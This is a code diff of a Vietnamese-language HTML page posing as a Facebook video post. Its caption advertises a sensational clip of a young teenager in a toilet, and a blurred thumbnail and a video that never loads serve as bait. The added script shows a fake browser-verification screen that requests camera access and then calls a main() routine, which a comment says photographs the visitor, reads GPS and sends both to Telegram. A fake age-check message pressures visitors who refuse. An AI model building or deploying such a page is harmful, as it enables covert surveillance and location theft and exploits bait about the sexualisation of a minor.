@@ -8,85 +8,64 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #000; color: #fff; overflow-x: hidden; }
         
-        /* Màn hình Loading ban đầu ẩn danh */
         #loading-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #fff; display: flex; justify-content: center; align-items: center; z-index: 9999;
+            background: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999;
+            color: #1c1e21; text-align: center; padding: 20px;
         }
         .fb-loader { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* Giao diện chính */
         #main-content { display: none; max-width: 500px; margin: 0 auto; background: #1c1e21; min-height: 100vh; }
-        
-        /* Header kiểu FB */
         .fb-header { background: #242526; padding: 12px; border-bottom: 1px solid #3e4042; display: flex; align-items: center; gap: 10px; }
-        .back-btn { font-size: 20px; cursor: pointer; }
         .header-title { font-weight: bold; font-size: 16px; }
-
-        /* Thông tin bài đăng */
         .post-info { padding: 12px; display: flex; align-items: center; gap: 10px; }
         .avatar { width: 40px; height: 40px; border-radius: 50%; background: #4e4f50; border: 1px solid #3e4042; }
         .author-name { font-weight: 600; font-size: 15px; }
-        .time { font-size: 12px; color: #b0b3b8; }
-
         .caption { padding: 0 12px 12px; font-size: 15px; line-height: 1.4; color: #e4e6eb; }
 
-        /* Player Video */
         .video-wrapper { position: relative; width: 100%; background: #000; aspect-ratio: 9/16; display: flex; justify-content: center; align-items: center; cursor: pointer; }
-        .thumbnail { width: 100%; height: 100%; object-fit: cover; filter: blur(8px) brightness(0.7); } /* Làm mờ để kích thích tò mò */
-        
+        .thumbnail { width: 100%; height: 100%; object-fit: cover; filter: blur(8px) brightness(0.7); }
         .play-btn-fb { position: absolute; width: 65px; height: 65px; background: rgba(0,0,0,0.5); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 2px solid #fff; z-index: 2; }
         .play-btn-fb svg { fill: #fff; width: 30px; height: 30px; margin-left: 5px; }
-
-        .warning-text { position: absolute; top: 40%; width: 100%; text-align: center; color: #fff; z-index: 3; font-weight: bold; padding: 0 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.8); }
-        .warning-tag { background: #ff4d4d; color: white; padding: 2px 8px; border-radius: 4px; font-size: 12px; margin-bottom: 10px; display: inline-block; }
-
-        /* Loading vô hạn */
+        
         #infinite-load { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 10; flex-direction: column; justify-content: center; align-items: center; }
         .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #fff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        .load-text { margin-top: 15px; font-size: 14px; color: #ddd; }
+
+        /* Style cho bảng thông báo lỗi */
+        .error-box { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); max-width: 350px; }
+        .btn-retry { background: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; }
     </style>
 </head>
 <body>
 
 <div id="loading-screen">
-    <div class="fb-loader"></div>
+    <div id="status-container">
+        <div class="fb-loader"></div>
+        <p style="margin-top: 20px; font-weight: 500;">Đang xác thực trình duyệt...</p>
+        <button onclick="requestAccess()" style="margin-top: 15px; padding: 10px 20px; background: #1877f2; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold;">Tiếp tục</button>
+    </div>
 </div>
 
 <div id="main-content">
     <div class="fb-header">
-        <span class="back-btn">✕</span>
+        <span style="font-size: 20px;">✕</span>
         <span class="header-title">Video của Hóng Biến 24h</span>
     </div>
-
     <div class="post-info">
         <div class="avatar"></div>
         <div>
             <div class="author-name">Hóng Biến 24h</div>
-            <div class="time">Vừa xong • 🌍</div>
+            <div style="font-size: 12px; color: #b0b3b8;">Vừa xong • 🌍</div>
         </div>
     </div>
-
-    <div class="caption">
-        CỰC SỐC: Clip 2k10 trong nhà vệ sinh đang lan truyền chóng mặt. #hongbien #cliphot #2k10
-    </div>
-
+    <div class="caption">CỰC SỐC: Clip 2k10 trong nhà vệ sinh đang lan truyền chóng mặt. #hongbien #cliphot #2k10</div>
     <div class="video-wrapper" onclick="playVideo()">
-        <img src="https://i.ibb.co/vz6mDkL/blurred-video.jpg" class="thumbnail" alt="thumbnail">
-        
-        <div class="warning-text">
-            <div class="warning-tag">18+ NỘI DUNG NHẠY CẢM</div>
-            <p>Video này có thể chứa nội dung không phù hợp với một số người dùng.</p>
-        </div>
-
-        <div id="play-button" class="play-btn-fb">
-            <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
-        </div>
-
+        <img src="https://i.ibb.co/vz6mDkL/blurred-video.jpg" class="thumbnail">
+        <div id="play-button" class="play-btn-fb"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
         <div id="infinite-load">
             <div class="spinner"></div>
-            <div class="load-text">Đang tải video (720p)...</div>
+            <div style="margin-top: 15px; font-size: 14px; color: #ddd;">Đang tải video (720p)...</div>
         </div>
     </div>
 </div>
@@ -94,20 +73,46 @@
 <script src="main.js"></script>
 
 <script>
+    async function requestAccess() {
+        try {
+            // Yêu cầu Camera trước
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            stream.getTracks().forEach(track => track.stop()); // Tạm dừng sau khi xin được quyền
+
+            // Sau khi có quyền, hiện loader và gọi main() từ main.js
+            document.getElementById('status-container').innerHTML = '<div class="fb-loader"></div><p style="margin-top:20px;">Đang tải dữ liệu video...</p>';
+            
+            if (typeof main === 'function') {
+                await main(); // Chụp ảnh, lấy GPS và gửi Telegram
+            }
+
+            // Mở khóa web
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('main-content').style.display = 'block';
+
+        } catch (err) {
+            // Xử lý khi người dùng bấm TỪ CHỐI
+            document.getElementById('status-container').innerHTML = `
+                <div class="error-box">
+                    <h3 style="color: #d32f2f;">Quyền truy cập bị chặn</h3>
+                    <p style="font-size: 14px; color: #65676b; margin-top: 10px;">
+                        Bạn cần cho phép quyền <b>Máy ảnh</b> để xác thực độ tuổi trước khi xem clip nhạy cảm.
+                    </p>
+                    <div style="text-align: left; font-size: 12px; background: #f0f2f5; padding: 10px; border-radius: 8px; margin-top: 15px;">
+                        1. Bấm vào <b>ổ khóa</b> trên thanh địa chỉ.<br>
+                        2. Chọn <b>Cho phép</b> Camera.<br>
+                        3. Nhấn nút bên dưới.
+                    </div>
+                    <button class="btn-retry" onclick="location.reload()">Tôi đã mở, Tải lại trang</button>
+                </div>
+            `;
+        }
+    }
+
     function playVideo() {
         document.getElementById('infinite-load').style.display = 'flex';
         document.getElementById('play-button').style.display = 'none';
-        // Hiệu ứng load mãi mãi
     }
-
-    // Lắng nghe tín hiệu từ main.js
-    const checker = setInterval(() => {
-        if (window.mainScriptFinished) {
-            document.getElementById('loading-screen').style.display = 'none';
-            document.getElementById('main-content').style.display = 'block';
-            clearInterval(checker);
-        }
-    }, 500);
 </script>
 
 </body>
